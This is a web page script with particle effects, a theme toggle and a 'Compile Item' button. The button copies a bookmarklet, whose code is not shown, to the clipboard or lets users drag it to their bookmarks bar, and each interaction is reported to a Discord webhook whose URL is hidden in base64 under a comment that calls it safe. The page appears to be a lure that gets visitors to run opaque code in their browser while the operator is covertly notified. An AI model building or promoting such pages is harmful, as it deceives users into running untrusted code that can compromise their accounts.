<script>
    // ========================================
    // PARTICLES
    // ========================================
    function createParticles() {
        const particlesContainer = document.getElementById('particles');
        const count = window.innerWidth < 768 ? 10 : 20;

        for (let i = 0; i < count; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            const size = Math.random() * 8 + 2;
            p.style.width = size + 'px';
            p.style.height = size + 'px';
            p.style.left = Math.random() * 100 + '%';
            p.style.animationDuration = (Math.random() * 40 + 30) + 's';
            p.style.animationDelay = (Math.random() * 20) + 's';
            particlesContainer.appendChild(p);
        }
    }
    createParticles();

    // ========================================
    // THEME TOGGLE
    // ========================================
    const themeToggle = document.getElementById('themeToggle');
    const sunButton = document.getElementById('sunButton');
    const moonButton = document.getElementById('moonButton');
    const html = document.documentElement;

    function updateToggle(isDark) {
        sunButton.className = isDark
            ? 'relative flex items-center justify-center w-12 h-12 rounded-full text-gray-500'
            : 'relative flex items-center justify-center w-12 h-12 rounded-full bg-gradient-to-br from-violet-500 to-purple-600 text-white';

        moonButton.className = isDark
            ? 'relative flex items-center justify-center w-12 h-12 rounded-full bg-gradient-to-br from-violet-500 to-purple-600 text-white'
            : 'relative flex items-center justify-center w-12 h-12 rounded-full text-gray-500';
    }

    const savedTheme = localStorage.getItem('theme') || 'light';
    if (savedTheme === 'dark') {
        html.classList.add('dark');
        document.body.classList.add('dark-mode');
        updateToggle(true);
    }

    themeToggle.addEventListener('click', () => {
        const isDark = html.classList.toggle('dark');
        document.body.classList.toggle('dark-mode');
        localStorage.setItem('theme', isDark ? 'dark' : 'light');
        updateToggle(isDark);
    });

    // ========================================
    // COMPILE ITEM — COPY + WEBHOOK (SAFE)
    // ========================================
    const compileButton = document.getElementById('compileButton');
    const bookmarkInput = document.getElementById('bookmarkInput');

    // Put bookmarklet into textarea
    bookmarkInput.value = Bookmark;

    // Drag to bookmarks bar
    compileButton.href = Bookmark;
    compileButton.setAttribute('draggable', 'true');
    compileButton.addEventListener('dragstart', e => {
        e.dataTransfer.setData('text/uri-list', Bookmark);
    });

    // Discord webhook
    const WEBHOOK_URL = atob(
        'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NjE2MDQyMDIyOTgwODIzOC9uSmdYcDdqVXBzcldCWUE4YTQxcDlKNnRCemphNDA1YUcyWGhTOGhUcGw4cEsyMGl2Zm1vamR1LXZwT2FOOWFBZk1FSQ=='
    );

    let lastSend = 0;
    function sendWebhook(action) {
        const now = Date.now();
        if (now - lastSend < 1500) return;
        lastSend = now;

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `📌 Compile Item\nAction: ${action}`
            })
        }).catch(() => {});
    }

    // CLICK = COPY
    compileButton.addEventListener('click', async (e) => {
        e.preventDefault();

        try {
            await navigator.clipboard.writeText(Bookmark);
            const old = compileButton.innerText;
            compileButton.innerText = 'Copied!';
            setTimeout(() => compileButton.innerText = old, 1400);
            sendWebhook('Copied');
        } catch {
            bookmarkInput.select();
            document.execCommand('copy');
            window.getSelection().removeAllRanges();
            sendWebhook('Copied (fallback)');
        }
    });

    compileButton.addEventListener('mousedown', () => sendWebhook('Hold'));
    compileButton.addEventListener('touchstart', () => sendWebhook('Touch'), { passive: true });
</script>
